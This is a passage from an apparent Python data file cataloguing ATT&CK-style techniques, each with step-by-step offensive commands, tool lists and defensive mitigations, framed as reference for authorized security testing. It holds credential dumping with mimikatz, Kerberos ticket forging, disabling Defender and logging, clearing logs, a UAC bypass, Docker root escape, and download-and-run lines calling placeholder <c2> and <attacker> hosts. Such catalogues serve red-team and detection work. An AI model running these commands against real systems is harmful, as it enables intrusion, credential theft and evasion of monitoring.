            "mitigations": [
                "Secure Boot enforcement",
                "UEFI firmware integrity monitoring",
                "TPM-based boot attestation",
                "Hypervisor detection tools",
            ],
        },
    ],
    "privilege_escalation": [
        {
            "id": "T1068",
            "name": "Exploitation for Privilege Escalation",
            "sub": [],
            "desc": "Adversaries exploit software vulnerabilities to escalate privileges.",
            "steps": '1. Enumerate privileges: `whoami /priv` and `whoami /groups`\n2. Check for kernel exploits: `systeminfo` then search for matching CVEs\n3. Run privilege escalation framework: `winPEAS.exe` or `linPEAS.sh`\n4. Exploit found vulnerability: `msfconsole -x "use exploit/windows/local/<module>; set SESSION 1; run"`',
            "tools": ["winPEAS", "linPEAS", "Metasploit", "BeRoot", "PowerUp"],
            "mitigations": [
                "Patch management",
                "Least privilege principle",
                "Application control",
                "Kernel exploit monitoring",
            ],
        },
        {
            "id": "T1068.001",
            "name": "Kernel Exploitation",
            "sub": [],
            "desc": "Adversaries exploit kernel-level vulnerabilities for privilege escalation during authorized security testing.",
            "steps": "1. Kernel version enumeration: `uname -r` (Linux) or `systeminfo` (Windows)\n2. Search for matching kernel CVEs: `searchsploit linux kernel <version> privilege escalation`\n3. Compile and execute kernel exploit: `gcc -o privesc exploit.c && ./privesc`\n4. Verify elevated privileges: `id` or `whoami /priv`",
            "tools": [
                "searchsploit",
                "linux-exploit-suggester",
                "Windows-Exploit-Suggester",
                "Metasploit",
            ],
            "mitigations": [
                "Kernel patch management",
                "GRSEC/PaX kernel hardening",
                "SELinux/AppArmor enforcement",
                "Kernel exploit detection",
            ],
        },
        {
            "id": "T1548",
            "name": "Abuse Elevation Control Mechanisms",
            "sub": ["T1548.001", "T1548.002"],
            "desc": "Adversaries bypass elevation control mechanisms like UAC and sudo.",
            "steps": '1. UAC bypass via fodhelper: `reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v "(Default)" /d "C:\\temp\\payload.exe"\n2. Sudo exploitation: `sudo -l` to find misconfigured NOPASSWD entries\n3. Runas bypass: `runas /user:admin "C:\\temp\\payload.exe"`\n4. Cleanup: `reg delete HKCU\\Software\\Classes\\ms-settings /f`',
            "tools": ["UACMe", "PowerUp", "sudo", "gtfobins"],
            "mitigations": [
                "UAC set to Always Notify",
                "Sudo configuration auditing",
                "Privileged access management",
            ],
        },
        {
            "id": "T1548.001",
            "name": "SUID/GTFOBins Exploitation",
            "sub": [],
            "desc": "Adversaries exploit misconfigured SUID binaries and GTFOBins for privilege escalation during security testing.",
            "steps": "1. Find SUID binaries: `find / -perm -4000 -type f 2>/dev/null`\n2. Check GTFOBins: cross-reference SUID binaries against GTFOBins list\n3. Exploit SUID binary: `./<suid_binary> -p` (python), `find . -exec /bin/sh -p \\;` (find with SUID)\n4. Exploit sudo misconfiguration: `sudo -l` then `sudo <allowed_command> ` with GTFOBins escape",
            "tools": ["GTFOBins", "linPEAS", "sudo", "find"],
            "mitigations": [
                "SUID binary auditing",
                "Remove unnecessary SUID bits",
                "Sudo configuration hardening",
                "Regular SUID inventory checks",
            ],
        },
        {
            "id": "T1134",
            "name": "Access Token Manipulation",
            "sub": ["T1134.001", "T1134.002", "T1134.003"],
            "desc": "Adversaries manipulate access tokens to escalate privileges during authorized security testing.",
            "steps": '1. Token impersonation: `mimikatz.exe "token::elevate /domainadmin" "exit"`\n2. Make and impersonate token: `make_token <domain>\\\\<admin> <password>` via Cobalt Strike\n3. Parent PID spoofing: `ppspoof.exe <target_pid> <command>`\n4. Steal token from process: `mimikatz.exe "privilege::debug" "token::elevate /id:<pid>" "exit"`',
            "tools": ["mimikatz", "Cobalt Strike", "Incognito", "ppspoof"],
            "mitigations": [
                "Token protection via Credential Guard",
                "Privileged access management",
                "Process-level monitoring",
                "EDR token manipulation detection",
            ],
        },
        {
            "id": "T1055",
            "name": "Process Injection",
            "sub": ["T1055.001", "T1055.003", "T1055.012"],
            "desc": "Adversaries inject code into running processes to escalate privileges and evade detection.",
            "steps": "1. DLL injection: `rundll32.exe C:\\temp\\malicious.dll,StartHook`\n2. Process hollowing: `CreateProcess(suspended) → NtUnmapViewOfSection → WriteProcessMemory → ResumeThread`\n3. APC injection: `QueueUserAPC(LoadLibrary, targetThread, dllPath)`\n4. Thread hijacking: `SuspendThread → GetThreadContext → SetThreadContext → ResumeThread`",
            "tools": [
                "Process Hacker",
                "mimikatz",
                "Cobalt Strike",
                "Custom injectors",
            ],
            "mitigations": [
                "Process monitoring",
                "DLL load auditing",
                "EDR behavioral detection",
                "ACG/CIG mitigation",
            ],
        },
        {
            "id": "T1548.003",
            "name": "Docker Group Privilege Escalation",
            "sub": [],
            "desc": "Adversaries exploit Docker group membership to escalate privileges to root on the host during container security testing.",
            "steps": "1. Check Docker group membership: `id && groups`\n2. Mount host filesystem in container: `docker run -v /:/host -it alpine chroot /host`\n3. Write SSH key: `docker run -v /root:/root alpine sh -c 'echo <pubkey> >> /root/.ssh/authorized_keys'`\n4. Access host as root: `ssh root@<host>` with placed key",
            "tools": ["docker", "podman", "containerd"],
            "mitigations": [
                "Restrict Docker group membership",
                "Use rootless Docker",
                "Enable user namespace remapping",
                "Pod security policies",
            ],
        },
    ],
    "defense_evasion": [
        {
            "id": "T1562",
            "name": "Impair Defenses",
            "sub": ["T1562.001", "T1562.002"],
            "desc": "Adversaries disable or modify security tools to evade detection.",
            "steps": '1. Disable Windows Defender: `Set-MpPreference -DisableRealtimeMonitoring $true`\n2. Stop security service: `sc stop WinDefend`\n3. Add Defender exclusion: `Add-MpPreference -ExclusionPath "C:\\temp"`\n4. Linux: `systemctl stop falcond && systemctl disable falcond`',
            "tools": ["Set-MpPreference", "sc.exe", "systemctl", "iptables"],
            "mitigations": [
                "Tamper protection for AV",
                "SIEM monitoring for defense disabling",
                "EDR with self-protection",
            ],
        },
        {
            "id": "T1562.001",
            "name": "Disable or Modify Tools",
            "sub": [],
            "desc": "Adversaries disable or modify security tools to evade detection during security testing.",
            "steps": "1. Disable Windows Defender real-time protection: `Set-MpPreference -DisableRealtimeMonitoring $true`\n2. Disable Sysmon: `sc config Sysmon64 start= disabled && sc stop Sysmon64`\n3. Clear audit policy: `auditpol /clear`\n4. Modify Linux logging: `systemctl stop rsyslog && systemctl disable rsyslog`",
            "tools": [
                "Set-MpPreference",
                "sc.exe",
                "auditpol",
                "systemctl",
                "iptables",
            ],
            "mitigations": [
                "Tamper protection for security tools",
                "Immutable logging (write-once storage)",
                "EDR self-protection mechanisms",
                "Centralized log forwarding (SIEM)",
            ],
        },
        {
            "id": "T1027",
            "name": "Obfuscated Files or Information",
            "sub": ["T1027.001", "T1027.002", "T1027.005"],
            "desc": "Adversaries obfuscate files and information to evade detection.",
            "steps": "1. Encode PowerShell payload: `powershell -enc <base64_encoded_command>`\n2. XOR encrypt payload: `python3 xor_encrypt.py --input payload.exe --key 0x41 --output payload.bin`\n3. Compress and stage: `gzip payload.exe && cat payload.exe.gz | base64`\n4. String obfuscation: replace strings with character arrays and runtime concatenation",
            "tools": ["PowerShell -enc", "ConfuserEx", "UPX", "custom obfuscators"],
            "mitigations": [
                "Deobfuscation in analysis pipeline",
                "Entropy-based detection",
                "AMSI logging",
                "Emulation-based detection",
            ],
        },
        {
            "id": "T1070",
            "name": "Indicator Removal",
            "sub": ["T1070.001", "T1070.002", "T1070.004"],
            "desc": "Adversaries remove indicators of compromise to evade forensic detection.",
            "steps": "1. Clear Windows event logs: `wevtutil cl System && wevtutil cl Security`\n2. Timestomp files: `touch -r legitimate.exe malicious.exe`\n3. Delete prefetch files: `del /q C:\\Windows\\Prefetch\\*`\n4. Clear bash history: `history -c && unset HISTFILE`",
            "tools": ["wevtutil", "touch", "del", "Event Viewer", "LogParser"],
            "mitigations": [
                "Centralized logging (SIEM)",
                "Write-once storage for logs",
                "Endpoint telemetry forwarding",
                "File integrity monitoring",
            ],
        },
        {
            "id": "T1055.012",
            "name": "Process Hollowing",
            "sub": [],
            "desc": "Adversaries use process hollowing to execute malicious code within a legitimate process for defense evasion during security testing.",
            "steps": "1. Create suspended process: `CreateProcess('C:\\Windows\\explorer.exe', CREATE_SUSPENDED)`\n2. Unmap legitimate image: `NtUnmapViewOfSection(hProcess, imageBase)`\n3. Write malicious payload: `WriteProcessMemory(hProcess, imageBase, payload, payloadSize)`\n4. Resume execution: `ResumeThread(hThread)` — malicious code runs under legitimate process",
            "tools": [
                "Process Hollowing tools",
                "Cobalt Strike",
                "Metasploit",
                "custom loaders",
            ],
            "mitigations": [
                "Process memory scanning",
                "Memory integrity verification",
                "EDR hollowing detection heuristics",
                "ACG/CIG process protections",
            ],
        },
        {
            "id": "T1055.001",
            "name": "DLL Injection",
            "sub": [],
            "desc": "Adversaries inject DLLs into running processes for defense evasion during authorized security testing.",
            "steps": "1. Open target process: `OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID)`\n2. Allocate memory: `VirtualAllocEx(hProcess, NULL, pathSize, MEM_COMMIT, PAGE_READWRITE)`\n3. Write DLL path: `WriteProcessMemory(hProcess, remoteBuf, dllPath, pathSize, NULL)`\n4. Create remote thread: `CreateRemoteThread(hProcess, NULL, 0, LoadLibraryA, remoteBuf, 0, NULL)`",
            "tools": [
                "Process Hacker",
                "DLL injectors",
                "Cobalt Strike",
                "custom injectors",
            ],
            "mitigations": [
                "DLL load monitoring",
                "Remote thread creation detection",
                "EDR injection heuristics",
                "ACG process protection",
            ],
        },
        {
            "id": "T1036",
            "name": "Masquerading",
            "sub": ["T1036.001", "T1036.002", "T1036.003", "T1036.004"],
            "desc": "Adversaries disguise malicious files and processes as legitimate ones to evade detection during security testing.",
            "steps": "1. Rename payload: `copy payload.exe C:\\Windows\\svchost.exe`\n2. Modify file metadata: `attrib +h +s payload.exe` and change timestamps\n3. Right-to-left override: name file `doc_exe.pdf` (displays as `pdf.exe`)\n4. Match legitimate binary name: place payload in system32 with system-looking name",
            "tools": ["attrib", "touch", "Resource Hacker", "sigthief"],
            "mitigations": [
                "File path monitoring",
                "Binary metadata verification",
                "Code signing enforcement",
                "Process name/path auditing",
            ],
        },
        {
            "id": "T1216",
            "name": "Signed Binary Proxy Execution",
            "sub": ["T1216.001"],
            "desc": "Adversaries use signed legitimate binaries to proxy execution of malicious code during security testing.",
            "steps": "1. Sigthief to append certificate: `sigthief -i legitimate.exe -s <cert> -o payload.exe`\n2. Use rundll32 for execution: `rundll32.exe payload.dll,EntryPoint`\n3. Leverage Mavinject: `mavinject.exe <pid> /INJECTRUNNING <payload.dll>`\n4. Use certutil for download: `certutil -urlcache -split -f http://<c2>/payload.exe payload.exe`",
            "tools": ["rundll32", "mavinject", "certutil", "sigthief", "MsBuild"],
            "mitigations": [
                "Binary execution monitoring",
                "LOLBIN usage auditing",
                "Application whitelisting",
                "EDR behavioral detection",
            ],
        },
    ],
    "credential_access": [
        {
            "id": "T1110",
            "name": "Brute Force",
            "sub": ["T1110.001", "T1110.002", "T1110.003", "T1110.004"],
            "desc": "Adversaries use brute force techniques to gain access to accounts.",
            "steps": "1. Password spraying: `kerbrute passwordspray -d <domain> users.txt 'Spring2025!'`\n2. Credential stuffing: `python3 hydra -L users.txt -P passwords.txt <target> ssh`\n3. Kerberoasting: `GetUserSPNs.py <domain>/<user>:<pass> -request -outputfile hashes.txt`\n4. Online cracking: `hashcat -m 13100 hashes.txt wordlist.txt`",
            "tools": [
                "hydra",
                "kerbrute",
                "hashcat",
                "Impacket-GetUserSPNs",
                "John the Ripper",
            ],
            "mitigations": [
                "MFA enforcement",
                "Account lockout policies",
                "Password complexity requirements",
                "Monitor for multiple failed logons (ID 4625)",
            ],
        },
        {
            "id": "T1110.001",
            "name": "Brute Force - Password Spraying",
            "sub": [],
            "desc": "Adversaries use password spraying across many accounts to gain access during security testing.",
            "steps": "1. Active Directory password spray: `kerbrute passwordspray -d <domain> users.txt 'Company2025!'`\n2. SSH password spray: `python3 spray.py --target <target> --userlist users.txt --password 'Winter2025!'\n3. O365 password spray: `MSOLSpray -UserList users.txt -Password 'Summer2025!' -URL https://login.microsoftonline.com`\n4. Monitor for successful logins after spray: `Get-EventLog -LogName Security -InstanceId 4624`",
            "tools": ["kerbrute", "MSOLSpray", "spray.py", "TGS", "SmartHashcat"],
            "mitigations": [
                "MFA enforcement on all accounts",
                "Smart lockout policies",
                "Password complexity and rotation",
                "Anomaly detection for login patterns",
            ],
        },
        {
            "id": "T1003",
            "name": "OS Credential Dumping",
            "sub": ["T1003.001", "T1003.002", "T1003.003"],
            "desc": "Adversaries dump OS credentials from memory and disk.",
            "steps": '1. LSASS memory dump: `mimikatz.exe "sekurlsa::logonpasswords" "exit"`\n2. SAM database: `reg save HKLM\\SAM sam.bak && reg save HKLM\\SYSTEM system.bak`\n3. /etc/shadow extraction: `cat /etc/shadow`\n4. Domain cached credentials: `mimikatz.exe "lsadump::cache" "exit"`',
            "tools": ["mimikatz", "procdump", "reg.exe", "LaZagne", "secretsdump.py"],
            "mitigations": [
                "Credential Guard",
                "LSASS protection (RunAsPPL)",
                "EDR memory protection",
                "LAPS deployment",
            ],
        },
        {
            "id": "T1558",
            "name": "Steal or Forge Kerberos Tickets",
            "sub": ["T1558.001", "T1558.003"],
            "desc": "Adversaries steal or forge Kerberos tickets for credential access.",
            "steps": "1. Kerberoasting: `GetUserSPNs.py <domain>/<user>:<pass> -request`\n2. AS-REP roasting: `GetNPUsers.py <domain>/ -usersfile users.txt`\n3. Golden ticket: `ticketer.py -domain <domain> -nthash <krbtgt_hash> -domain-sid <sid> Administrator`\n4. Silver ticket: `ticketer.py -spn cifs/<target> -domain <domain> -nthash <service_hash> <user>`",
            "tools": ["Impacket", "Rubeus", "mimikatz", "Kekeo"],
            "mitigations": [
                "AES encryption for Kerberos",
                "Account pre-authentication enforcement",
                "Kerberoasting detection (RC4 ticket requests)",
                "LAPS for local admin",
            ],
        },
        {
            "id": "T1558.003",
            "name": "Forge Kerberos Tickets - Golden/Silver Ticket",
            "sub": [],
            "desc": "Adversaries forge Kerberos tickets (Golden/Silver) for persistent credential access during security testing.",
            "steps": '1. Extract krbtgt hash: `mimikatz.exe "lsadump::dcsync /user:krbtgt" "exit"`\n2. Create Golden Ticket: `ticketer.py -domain <domain> -nthash <krbtgt_hash> -domain-sid <sid> Administrator`\n3. Create Silver Ticket: `ticketer.py -spn cifs/<target> -domain <domain> -nthash <service_hash> Administrator`\n4. Use forged ticket: `export KRB5CCNAME=/tmp/ticket.ccache && psexec.py <domain>/Administrator@<target> -k`',
            "tools": ["mimikatz", "Impacket-ticketer", "Rubeus", "Kekeo"],
            "mitigations": [
                "Regular krbtgt password rotation",
                "AES encryption enforcement",
                "Kerberos event monitoring (ID 4768, 4769)",
                "Tiered administration model",
            ],
        },
        {
            "id": "T1550",
            "name": "Use Alternate Authentication Material",
            "sub": ["T1550.001", "T1550.002", "T1550.003"],
            "desc": "Adversaries use alternate authentication material such as pass-the-hash and pass-the-ticket for lateral movement and credential access.",
            "steps": "1. Pass-the-hash: `pth-winexe -U <domain>\\\\<user>%<nthash> //<target>`\n2. Pass-the-ticket: `export KRB5CCNAME=/tmp/ticket.ccache && smbexec.py <domain>/<user>@<target> -k`\n3. Overpass-the-hash: `Rubeus.exe asktgt /domain:<domain> /user:<user> /rc4:<hash> /ptt`\n4. Validate access: `smbclient //<target>/C$ -U <user> -W <domain> -k`",
            "tools": ["Impacket", "Rubeus", "mimikatz", "Kekeo"],
            "mitigations": [
                "Credential Guard and LAPS",
                "Kerberos enforcement (no NTLM fallback)",
                "Enhanced session security",
                "Privileged access workstations",
            ],
        },
        {
            "id": "T1040",
            "name": "Network Sniffing",
            "sub": [],
            "desc": "Adversaries sniff network traffic to capture credentials and sensitive data during security testing.",
            "steps": "1. Capture traffic: `tcpdump -i eth0 -w /tmp/capture.pcap`\n2. Filter for credentials: `tshark -r /tmp/capture.pcap -Y 'http.request.method == POST'`\n3. Extract passwords: `ettercap -T -q -i eth0 -L /tmp/log`\n4. ARP spoofing for MITM: `arpspoof -i eth0 -t <target> <gateway>`",
            "tools": ["tcpdump", "Wireshark", "ettercap", "arpspoof", "Bettercap"],
            "mitigations": [
                "Network encryption (TLS/IPSec)",
                "Port security (802.1X)",
                "ARP inspection",
                "Dynamic ARP inspection",
            ],
        },
    ],
    "discovery": [
        {
            "id": "T1087",
            "name": "Account Discovery",
            "sub": ["T1087.001", "T1087.002"],
            "desc": "Adversaries discover accounts on the target system or domain.",
            "steps": '1. Local accounts: `net user && net localgroup administrators`\n2. Domain users: `net user /domain && net group "Domain Admins" /domain`\n3. LDAP query: `ldapsearch -x -H ldap://<dc> -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName`\n4. Enumerate via PowerShell: `Get-ADUser -Filter * -Properties SamAccountName,MemberOf`',
            "tools": ["net.exe", "ldapsearch", "PowerView", "AD Module", "BloodHound"],
            "mitigations": [
                "Account monitoring",
                "LDAP query auditing",
                "Restrict AD enumeration permissions",
            ],
        },
        {
            "id": "T1046",
            "name": "Network Service Discovery",
            "sub": [],
            "desc": "Adversaries discover network services running on target systems.",
            "steps": "1. Port scanning: `nmap -sV -sC -p- <target>`\n2. Service enumeration: `nmap --script=default,vuln <target>`\n3. DNS zone transfer: `dig axfr <domain> @<dns_server>`\n4. SMB enumeration: `smbclient -L //<target> -N && enum4linux <target>`",
            "tools": ["nmap", "smbclient", "enum4linux", "dig", "masscan"],
            "mitigations": [
                "Network segmentation",
                "Service minimization",
                "Port scan detection",
                "Disable unnecessary services",
            ],
        },
        {
            "id": "T1083",
            "name": "File and Directory Discovery",
            "sub": [],
            "desc": "Adversaries discover files and directories on target systems.",
            "steps": "1. Windows file search: `dir /s /b C:\\Users\\*password* C:\\Users\\*config*`\n2. Linux find: `find / -name '*.conf' -o -name '*.cfg' -o -name '*password*' 2>/dev/null`\n3. Search for SSH keys: `find / -name 'id_rsa' -o -name '*.pem' 2>/dev/null`\n4. Locate database files: `find / -name '*.db' -o -name '*.sqlite' -o -name '*.mdb' 2>/dev/null`",
            "tools": ["dir", "find", "locate", "Get-ChildItem", "SearchCmd"],
            "mitigations": [
                "File access auditing",
                "NTFS permissions",
                "Restricted search access",
            ],
        },
        {
            "id": "T1082",
            "name": "System Information Discovery",
            "sub": [],
            "desc": "Adversaries gather system information to understand the target environment during security testing.",
            "steps": "1. Windows system info: `systeminfo && hostname && whoami /all`\n2. Linux system info: `uname -a && cat /etc/os-release && lscpu`\n3. macOS system info: `system_profiler SPSoftwareDataType && sw_vers`\n4. Environment variables: `set` (Windows) or `env` (Linux) to find credentials and paths",
            "tools": ["systeminfo", "uname", "system_profiler", "env", "set"],
            "mitigations": [
                "System information access controls",
                "Environment variable hardening",
                "Least privilege for enumeration commands",
                "Honeypot deployment for enumeration detection",
            ],
        },
        {
            "id": "T1016",
            "name": "System Network Configuration Discovery",
            "sub": [],
            "desc": "Adversaries discover network configuration to map the target environment during security testing.",
            "steps": "1. Windows: `ipconfig /all && route print && netstat -an`\n2. Linux: `ifconfig -a && ip route show && netstat -tulnp`\n3. ARP table: `arp -a` (Windows) or `ip neigh` (Linux)\n4. DNS configuration: `type C:\\Windows\\System32\\config\\dns` or `cat /etc/resolv.conf`",
            "tools": ["ipconfig", "ifconfig", "netstat", "route", "arp"],
            "mitigations": [
                "Network information access controls",
                "Host-based firewall restrictions",
                "Network segmentation awareness",
            ],
        },
        {
            "id": "T1057",
            "name": "Process Discovery",
            "sub": [],
            "desc": "Adversaries discover running processes to identify security tools and target applications during security testing.",
            "steps": '1. List processes: `tasklist /v` (Windows) or `ps aux` (Linux)\n2. WMI process enumeration: `wmic process list brief`\n3. Find security tools: `tasklist /v | findstr /i "defender av scan"`\n4. PowerShell process details: `Get-Process | Select-Object Name,Id,Path | Format-Table`',
            "tools": ["tasklist", "ps", "wmic", "Get-Process", "procps"],
            "mitigations": [
                "Process information access restrictions",
                "Security tool process name obfuscation",
                "Endpoint detection for enumeration",
            ],
        },
        {
            "id": "T1580",
            "name": "Cloud Infrastructure Discovery",
            "sub": [],
            "desc": "Adversaries discover cloud infrastructure and services during authorized cloud security testing.",
            "steps": "1. AWS enumeration: `aws sts get-caller-identity && aws ec2 describe-instances`\n2. Azure enumeration: `az vm list && az resource list`\n3. GCP enumeration: `gcloud compute instances list && gcloud iam roles list`\n4. Cloud metadata: `curl http://169.254.169.254/latest/meta-data/`",
            "tools": ["aws cli", "az cli", "gcloud", "CloudSploit", "ScoutSuite"],
            "mitigations": [
                "IAM least privilege policies",
                "Cloud resource tagging and inventory",
                "Metadata service protection (IMDSv2)",
                "Cloud audit logging",
            ],
        },
        {
            "id": "T1033",
            "name": "System Owner/User Discovery",
            "sub": [],
            "desc": "Adversaries identify system owners and users to find high-value targets during security testing.",
            "steps": '1. Current user: `whoami && whoami /priv` (Windows) or `id && sudo -l` (Linux)\n2. Logged-on users: `query user` or `w` (Linux)\n3. Domain admins: `net group "Domain Admins" /domain`\n4. Local admins: `net localgroup administrators`',
            "tools": ["whoami", "id", "net.exe", "query", "w"],
            "mitigations": [
                "User enumeration restrictions",
                "Privileged account monitoring",
                "AD ACL hardening",
            ],
        },
    ],
    "lateral_movement": [
        {
            "id": "T1021",
            "name": "Remote Services",
            "sub": ["T1021.001", "T1021.002", "T1021.004"],
            "desc": "Adversaries use remote services to move laterally across a network.",
            "steps": "1. SSH lateral movement: `ssh <user>@<target> -i stolen_key`\n2. RDP lateral movement: `xfreerdp /v:<target> /u:<user> /p:<password> /cert:ignore`\n3. SMB lateral movement: `smbexec.py <domain>/<user>:<pass>@<target>`\n4. WinRM: `evilwinrm -i <target> -u <user> -H <nthash>`",
            "tools": ["ssh", "xfreerdp", "Impacket", "Evil-WinRM", "PsExec"],
            "mitigations": [
                "Network segmentation",
                "MFA for remote access",
                "LAPS",
                "Restricted RDP access",
            ],
        },
        {
            "id": "T1570",
            "name": "Lateral Tool Transfer",
            "sub": [],
            "desc": "Adversaries transfer tools between systems for lateral movement.",
            "steps": "1. SMB file copy: `copy payload.exe \\\\<target>\\C$\\temp\\payload.exe`\n2. PowerShell download: `IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/payload.ps1')`\n3. Impacket SMB upload: `smbclient //<target>/C$ -U <user> -c 'put payload.exe payload.exe'`\n4. Certutil download: `certutil -urlcache -split -f http://<attacker>/payload.exe payload.exe`",
            "tools": ["copy/xcopy", "PowerShell", "certutil", "bitsadmin", "smbclient"],
            "mitigations": [
                "Network share monitoring",
                "Download monitoring",
                "Application whitelisting",
                "EDR file transfer detection",
            ],
        },
        {
            "id": "T1550.003",
            "name": "Pass-the-Ticket",
            "sub": [],
            "desc": "Adversaries use stolen Kerberos tickets to move laterally across systems during security testing.",
            "steps": '1. Export tickets from memory: `mimikatz.exe "kerberos::list /export" "exit"`\n2. Import ticket: `mimikatz.exe "kerberos::ptt C:\\tickets\\ticket.kirbi" "exit"`\n3. Or use Impacket: `export KRB5CCNAME=/tmp/admin.ccache && smbexec.py <domain>/admin@<target> -k`\n4. Verify access: `klist` to confirm ticket is applied',
            "tools": ["mimikatz", "Impacket", "Rubeus", "Kekeo"],
            "mitigations": [
                "Kerberos ticket lifetime reduction",
                "Privileged Access Workstations",
                "Kerberos ARMOR (FAST)",
                "Monitor for ticket reuse anomalies",
            ],
        },
        {
            "id": "T1021.004",
            "name": "SSH Remote Copy",
            "sub": [],
            "desc": "Adversaries use SSH to copy files and move laterally during security testing.",
            "steps": "1. Copy files via SCP: `scp payload.py <user>@<target>:/tmp/payload.py`\n2. SSH with key: `ssh -i stolen_key.pem <user>@<target> 'bash -s' < script.sh`\n3. SSH tunnel for pivoting: `ssh -L 8080:<internal>:80 <user>@<jump_host> -N`\n4. ProxyJump for multi-hop: `ssh -J <user>@<jump1> <user>@<target>`",
            "tools": ["ssh", "scp", "rsync", "ssh-keygen"],
            "mitigations": [
                "SSH key rotation",
                "Disable password authentication",
                "SSH certificate-based auth",
                "Jump host hardening",
            ],
        },
        {
            "id": "T1021.003",
            "name": "Distributed Component Object Model",
            "sub": [],
            "desc": "Adversaries use DCOM for lateral movement and remote execution during security testing.",
            "steps": "1. Execute command via DCOM: `[Activator]::CreateInstance([Type]::GetTypeFromProgID('MMC20.Application','<target>')).Document.ActiveView.ExecuteShellCommand('cmd',$null,'/c payload.exe','7')`\n2. ShellWindows DCOM: `(New-Object -ComObject Shell.Application).Windows() | ForEach-Object { $_.Item().Document.Application.ShellExecute('cmd.exe','/c payload.exe') }`\n3. Enumerate DCOM applications: `Get-CimInstance -ClassName Win32_DCOMApplication`\n4. Register DCOM object on target for command execution",
            "tools": ["PowerShell DCOM", "DCOMExec.py", "impacket-dcomexec"],
            "mitigations": [
                "DCOM access restrictions",
                "Network segmentation",
                "Firewall rules for DCOM ports",
                "EDR monitoring for DCOM invocation",
            ],
        },
        {
            "id": "T1021.005",
            "name": "Apple Remote Desktop",
            "sub": [],
            "desc": "Adversaries use Apple Remote Desktop and VNC for lateral movement on macOS systems during security testing.",
            "steps": "1. Connect via VNC: `vncviewer <target>:5900`\n2. SSH tunnel to ARD: `ssh -L 5900:localhost:5900 <user>@<target>` then VNC connect\n3. Apple Remote Desktop command: `ssh <user>@<target> 'sudo /System/Library/CoreServices/ARD Agent.app/Contents/Resources/kickstart -configure -access -on -privs -all -users <admin_user>'`\n4. Screen sharing: `open vnc://<target>:5900`",
            "tools": ["VNC Viewer", "Apple Remote Desktop", "Screen Sharing", "ssh"],
            "mitigations": [
                "ARD/VNC access restrictions",
                "Strong authentication for remote access",
                "Network segmentation",
                "Endpoint detection for remote desktop sessions",
            ],
        },
    ],
    "command_and_control": [
        {
            "id": "T1071",
            "name": "Application Layer Protocol",
            "sub": ["T1071.001", "T1071.004"],
            "desc": "Adversaries use application layer protocols for C2 communication.",
            "steps": "1. HTTP C2: `python3 http_c2.py --listener 8080 --domain <domain>`\n2. DNS C2: `dnscat2 --domain <domain> --dns-server <dns_ip>`\n3. HTTPS with valid cert: `cobaltstrike -listener https -port 443`\n4. WebSocket C2: `ws_c2.py --wss wss://<domain>/ws`",
            "tools": ["Cobalt Strike", "dnscat2", "Sliver", "PoshC2", "Mythic C2"],
            "mitigations": [
                "Network traffic analysis",
                "DNS anomaly detection",
                "TLS inspection",
                "Beacon pattern detection",
            ],
        },
        {
            "id": "T1105",
            "name": "Ingress Tool Transfer",
            "sub": [],
            "desc": "Adversaries transfer tools from external systems to compromised hosts.",
            "steps": "1. PowerShell download: `Invoke-WebRequest -Uri http://<c2>/tool.exe -OutFile C:\\temp\\tool.exe`\n2. Bitsadmin: `bitsadmin /transfer myjob /download /priority normal http://<c2>/tool.exe C:\\temp\\tool.exe`\n3. Certutil: `certutil -urlcache -split -f http://<c2>/tool.ps1 tool.ps1`\n4. Wget: `wget http://<c2>/tool -O /tmp/tool && chmod +x /tmp/tool`",
            "tools": ["PowerShell", "bitsadmin", "certutil", "wget", "curl"],
            "mitigations": [
                "Monitor unusual download patterns",
                "Block known LOLBIN downloads",
                "EDR download monitoring",
            ],
        },
        {
            "id": "T1090.003",
            "name": "Multi-Hop Proxy / Domain Fronting",
            "sub": [],
            "desc": "Adversaries use multi-hop proxies and domain fronting to obscure C2 communication during security testing.",
            "steps": "1. Domain fronting: `curl -H 'Host: <fronted_domain>' https://<cdn_domain>/path`\n2. SSH multi-hop proxy: `ssh -L 1080 <jump1> -J <user>@<jump2>`\n3. Proxy chaining: `proxychains4 nmap -sT <target>`\n4. TOR + proxy: `torsocks ssh <user>@<target> -o ProxyCommand='nc -X 5 -x 127.0.0.1:9050 %h %p'`",
            "tools": [
                "proxychains",
                "TOR",
                "SSH tunneling",
                "CDN domain fronting",
                "Chisel",
            ],
            "mitigations": [
                "TLS inspection and SNI checking",
                "Proxy authentication requirements",
                "Egress filtering",
                "CDN domain fronting detection",
            ],
        },
        {
            "id": "T1573",
            "name": "Encrypted Channel",
            "sub": ["T1573.001", "T1573.002"],
            "desc": "Adversaries use encrypted channels to obscure C2 communication during security testing.",
            "steps": "1. TLS C2 channel: configure HTTPS listener with valid certificate\n2. SSH tunnel: `ssh -D 1080 -N -f <user>@<c2_server>`\n3. Encrypted DNS tunnel: `dnscat2 --domain <domain> --encrypt-key <key>`\n4. Custom encrypted channel: `openssl s_client -connect <c2>:443 -tls1_3`",
            "tools": ["OpenSSL", "SSH", "dnscat2", "Cobalt Strike HTTPS", "Sliver"],
            "mitigations": [
                "TLS inspection (MITM proxy)",
                "DNS over HTTPS monitoring",
                "Encrypted traffic analytics",
                "Certificate pinning verification",
            ],
        },
        {
            "id": "T1102",
            "name": "Web Service",
            "sub": ["T1102.001", "T1102.002"],
            "desc": "Adversaries use legitimate web services for C2 communication during security testing.",
            "steps": "1. GitHub C2: use Issues API for command and response delivery\n2. Slack C2: `curl -X POST -H 'Authorization: Bearer <token>' -d 'command' https://slack.com/api/chat.postMessage`\n3. Telegram C2: `curl -s https://api.telegram.org/bot<token>/sendMessage -d chat_id=<id> -d text='command'`\n4. Cloud storage C2: `aws s3 cp /tmp/command_response s3://<bucket>/responses/`",
            "tools": [
                "GitHub API",
                "Slack API",
                "Telegram Bot API",
                "AWS S3",
                "Dropbox API",
            ],
            "mitigations": [
                "Web service monitoring and filtering",
                "API gateway inspection",
                "Cloud storage access monitoring",
                "Egress proxy with deep inspection",
            ],
        },
    ],
    "collection": [
        {
            "id": "T1560",
            "name": "Archive Collected Data",
            "sub": ["T1560.001", "T1560.002"],
            "desc": "Adversaries archive collected data for easier exfiltration.",
            "steps": "1. ZIP collection: `7z a -p<password> collection.zip C:\\Users\\*\\Documents\\*.docx`\n2. TAR archive: `tar czf /tmp/collection.tar.gz /home/*/.ssh/ /etc/shadow`\n3. RAR with encryption: `rar a -hp<password> collection.rar C:\\sensitive\\`\n4. Verify archive: `7z t collection.zip`",
